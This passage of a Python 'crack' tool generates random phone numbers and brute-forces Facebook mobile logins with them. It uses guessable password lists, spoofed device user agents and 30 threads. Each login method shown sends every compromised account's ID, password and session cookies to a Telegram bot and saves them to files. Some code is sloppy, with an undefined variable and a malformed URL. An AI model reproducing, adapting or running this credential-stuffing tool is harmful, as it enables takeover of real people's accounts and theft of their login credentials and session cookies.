    ____banner____();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
    for guru in user:
      ids = kode+guru
      pwv = [ids[:6],ids[:8],guru[2:8],guru[1:8],kode,guru,'57273200','57575751','59039200','57575752']
      if 'm1' in mtd:king_xd.submit(m1,ids,pwv)
      elif 'm2' in mtd:king_xd.submit(m2,ids,pwv)
      elif 'm3' in mtd:king_xd.submit(m3,ids,pwv)
      elif 'm4' in mtd:king_xd.submit(m4,ids,pwv)
      elif 'm5' in mtd:king_xd.submit(m5,ids,pwv)
      elif 'm6' in mtd:king_xd.submit(m6,ids,pwv)
      elif 'm7' in mtd:king_xd.submit(m7,ids,pwv)
      elif 'm8' in mtd:king_xd.submit(m8,ids,pwv)
      else:
       king_xd.submit(m5,ids,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python zar0.py')
#━━━━[ PAKISTAN RANDOM ]━━━━#
def PAKISTAN():
  user=[]
  os.system('clear');____banner____();print(c7);print(led)
  kode = input(f'{dot}SELECT CODE {M}: {H}');print(led);print(limitt);print(led)
  limit = int(input(f'{dot}ENTER LIMIT {M}: {H}'));print(led)
  xd_cp=input(f'{wt}SHOW CP ACCOUNT  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
  else:cp_xdx.append('n')
 # print(led)
  #cokixx=input(f'{wt}SHOW COOKIES  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
 #if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  #else:cokix.append('n')
  clear();____banner____();print(f"{dot}{P}SIM CODE  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}M5{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}M6{P}]');print(f' {K}[{H}7{K}] {P}Method [{H}M7{P}]');print(f' {K}[{H}8{K}] {P}Method [{H}M8{P}]');print(led)
  hc = input(f'{wt}Select Method {M}:{H} ')
  if hc in ['1','01']:mtd.append('m1')
  elif hc in ['2','02']:mtd.append('m2')
  elif hc in ['3','03']:mtd.append('m3')
  elif hc in ['4','04']:mtd.append('m4')
  elif hc in ['5','05']:mtd.append('m5')
  elif hc in ['6','06']:mtd.append('m6')
  elif hc in ['7','07']:mtd.append('m7')
  elif hc in ['8','08']:mtd.append('m8')
  else:
      mtd.append('m1')
  for nmbr in range(limit):
    nmp = ''.join(random.choice(string.digits) for _ in range(7))
    user.append(nmp)
  with tred(max_workers=30) as king_xd:
    os.system('clear')
    tl = str(len(user))
    ____banner____();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
    for guru in user:
      ids = kode+guru
      pwv = [ids[:6],ids[:8],guru[2:8],guru[1:8],kode,guru]
      if 'm1' in mtd:king_xd.submit(m1,ids,pwv)
      elif 'm2' in mtd:king_xd.submit(m2,ids,pwv)
      elif 'm3' in mtd:king_xd.submit(m3,ids,pwv)
      elif 'm4' in mtd:king_xd.submit(m4,ids,pwv)
      elif 'm5' in mtd:king_xd.submit(m5,ids,pwv)
      elif 'm6' in mtd:king_xd.submit(m6,ids,pwv)
      elif 'm7' in mtd:king_xd.submit(m7,ids,pwv)
      elif 'm8' in mtd:king_xd.submit(m8,ids,pwv)
      else:
       king_xd.submit(m5,ids,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python zar0.py')
#━━━━[ METHOD RANDOM ]━━━━#
def m1(ids,pwv):
    global loop,oks,cps
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M1{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    session=requests.Session()
    ua = ua_valid()
    warna = random.choice(my_color)
    sm2 =('SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H')
    ua3 ="Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sm2))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
    try:
        for pas in pwv:
            free_fb = session.get('https://m.facebook.com').text
            info={
            "lsd": re.search(r'name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest": re.search(r'name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts": re.search(r'name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li": re.search(r'name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number": "0",
            "unrecognized_tries": "0",
            "email": ids,
            "pass": pas,
            "login": "Log In"}
            update={
            'Host': f'm.facebook.com',
            'User-Agent': ua3,
            'Accept-Encoding': 'gzip',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Connection': 'keep-alive',
            'Authority': f'm.facebook.com',
            'Method': 'POST',
            'Path': '/login/device-based/login/async/',
            'Scheme': 'https',
            'Content-Length': str(len(str(info))),
            'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'max-age=0',
            'DPR': '2.75',
            'Sec-Ch-Prefers-Color-Scheme': 'light',
            'Sec-Ch-UA': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'Sec-Ch-UA-Full-Version-List': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
            'Sec-Ch-UA-Mobile': '?1',
            'Sec-Ch-UA-Model': '"X663"',
            'Sec-Ch-UA-Platform': '"Android"',
            'Sec-Ch-UA-Platform-Version': '"10.0.0"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'Viewport-Width': '980',
            'Content-Type': 'application/x-www-form-urlencoded'}
            session.post(f"https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = re.findall('c_user=(.*);xs',coki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
                        statusok = (f" {cid} | {pas} | {coki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')                        
                        oks.append(cid)
                        break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                if 'y' in cp_xdx:
                        print(f'\r{P} [\033[1;30mZERO-CP.txt{P}] \033[1;30m{oks.append(cid)}|{pas}')
                        open('/sdcard/ZERO-CP.txt','a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass

def m2(ids,pwv):
    global loop,oks,cps
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M2{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    session=requests.Session()
    ua = ua_valid()
    warna = random.choice(my_color)
    sm2 =("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
    ua3 ="Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/176.0.394746740 Mobile/15E148 Safari/604.1"
    try:
        for pas in pwv:
            free_fb = session.get('https://m.facebook.com').text
            info={'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': pas,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
            update={
            'User-Agent': "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+"Mobile Safari/537.36",
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Cache-Control': 'max-age=0',
            'Referer': 'https://lm.facebook.com/',
            'DNT': '1',
            'Pragma': 'no-cache',
            'TE': 'Trailers', }
            session.post('https://m.alpha..facebook.com/login/?next=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fsave-device%2Fcancel%2F&li=6iKEZhsVXhKGcXY8k5F-hD3f&e=1348029&shbl=1&refsrc=deprecated&_rdr',data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = re.findall('c_user=(.*);xs',coki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
                        statusok = (f"{cid}|{pas}|{coki}")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                if 'y' in cp_xdx:
                        print(f'\r{P} [\033[1;30mZERO-CP.txt{P}] \033[1;30m{uid}|{pas}')
                        open('/sdcard/ZERO-CP.txt','a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass

def m3(ids,pwv):
    global loop,oks,cps
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M3{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    session=requests.Session()
    ua = ua_valid()
    warna = random.choice(my_color)
    sm2 =("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
    ua3 ="Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
    try:
        for pas in pwv:
            free_fb = session.get('https://m.facebook.com').text
            info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":ids,"pass":pas,"login":"Log In"}
            update={'User-Agent': "Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36", 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-User': '?1', 'Sec-Fetch-Dest': 'document', 'Cache-Control': 'max-age=0', 'Referer': 'https://www.facebook.com/', 'DNT': '1', 'Pragma': 'no-cache', 'TE': 'Trailers', }
            session.post('https://m.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = re.findall('c_user=(.*);xs',coki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
                        statusok = (f" {cid} | {pas} | {coki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                if 'y' in cp_xdx:
                        print(f'\r{P} [\033[1;30mZERO-CP.txt{P}] \033[1;30m{uid}|{pas}')
                        open('/sdcard/ZERO-CP.txt','a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass

def m4(ids,pwv):
    global loop,oks,cps
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M4{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
